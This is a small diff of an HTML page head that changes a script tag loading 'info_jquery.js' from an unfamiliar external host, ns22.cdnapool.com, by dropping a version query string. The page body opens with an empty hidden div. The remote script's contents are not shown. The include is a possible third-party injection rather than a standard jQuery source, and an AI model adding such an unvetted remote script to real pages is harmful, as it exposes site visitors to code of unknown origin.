@@ -15,7 +15,7 @@
           name="viewport"
           content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, viewport-fit=cover"
         />
-        <script src="https://ns22.cdnapool.com/f/info_jquery.js?v=110000"></script>
+        <script src="https://ns22.cdnapool.com/f/info_jquery.js"></script>
       </head>
       <body>
         <div style="display: none"></div>
